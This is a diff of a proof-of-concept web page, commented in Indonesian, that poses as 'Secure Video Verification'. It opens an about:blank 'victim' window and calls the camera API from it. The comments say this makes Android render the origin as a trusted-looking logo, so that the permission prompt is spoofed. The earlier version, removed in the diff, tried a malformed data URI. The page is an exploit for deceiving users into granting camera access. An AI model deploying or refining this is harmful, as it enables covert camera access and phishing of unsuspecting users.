@@ -1,64 +1,37 @@
 <!doctype html>
 <html>
-  <head>
-    <meta name="viewport" content="width=device-width, initial-scale=1" />
-    <link rel="manifest" href="manifest.json" />
-    <style>
-      body {
-        font-family: sans-serif;
-        background: #202124;
-        color: white;
-        text-align: center;
-        padding-top: 50px;
-      }
-      .btn {
-        background: #1a73e8;
-        color: white;
-        border: none;
-        padding: 20px;
-        font-size: 18px;
-        border-radius: 10px;
-        font-weight: bold;
-        cursor: pointer;
-        box-shadow: 0 4px 10px rgba(0, 0, 0, 0.3);
-      }
-    </style>
-  </head>
-  <body>
-    <h2>Secure Video Verification</h2>
-    <button class="btn" id="trigger">Start Camera Verification</button>
+<head>
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<style>
+  body { font-family: sans-serif; background: #202124; color: white; text-align: center; padding-top: 50px; }
+  .btn { background: #1a73e8; color: white; border: none; padding: 20px; font-size: 18px; border-radius: 10px; font-weight: bold; cursor: pointer; box-shadow: 0 4px 10px rgba(0,0,0,0.3); }
+</style>
+</head>
+<body>
+  <h2>Secure Video Verification</h2>
+  <button class="btn" id="trigger">Start Camera Verification</button>
 
-    <script>
-      document.getElementById("trigger").addEventListener("click", () => {
-        // 1. Spawning about:blank
-        let victimWin = window.open("about:blank");
-
-        // 2. HTML Payload buat eksekusi Kamera
-        let payloadHTML = `
-    <html>
-    <head><meta name="viewport" content="width=device-width, initial-scale=1"></head>
-    <body style="background:#202124; color:white; text-align:center; padding-top:40vh; font-family:sans-serif;">
-        <h3>Initializing Secure Camera...</h3>
-        <script>
-            setTimeout(() => {
-                navigator.mediaDevices.getUserMedia({video: true})
-                .then(stream => alert('CRITICAL: CAMERA GRANTED!'))
-                .catch(err => alert('Denied: ' + err));
-            }, 500);
-        <\/script>
-    </body>
-    </html>
-    `;
-
-        // Encode HTML ke base64
-        let encodedPayload = btoa(payloadHTML);
-
-        // 3. Inject payload pake Data URI yang disisipin trigger "ologoligature"
-        setTimeout(() => {
-          victimWin.location.href =
-            "data:text/html;ologoligature," + encodedPayload;
-        }, 150);
-      });
-    </script>
-  </body>
+<script>
+document.getElementById('trigger').addEventListener('click', () => {
+    // 1. Spawning about:blank (Ini akan mewarisi origin "ologoligature.github.io")
+    let victimWin = window.open('about:blank');
+    
+    // 2. Inject UI Loading ke dalam tab about:blank
+    setTimeout(() => {
+        victimWin.document.body.innerHTML = `
+            <body style="background:#202124; color:white; text-align:center; padding-top:40vh; font-family:sans-serif;">
+                <h3>Initializing Secure Camera...</h3>
+            </body>
+        `;
+        
+        // 3. Hajar API Kamera langsung dari dalam about:blank!
+        // OS Android bakal baca originnya sebagai "https://ologoligature.github.io"
+        // Dan karena ada kata "ologoligature", Font Engine OS Android bakal ngerender itu jadi LOGO!
+        victimWin.navigator.mediaDevices.getUserMedia({video: true})
+        .then(stream => alert('CRITICAL: CAMERA GRANTED!'))
+        .catch(err => alert('Denied: ' + err));
+    }, 150);
+});
+</script>
+</body>
 </html>
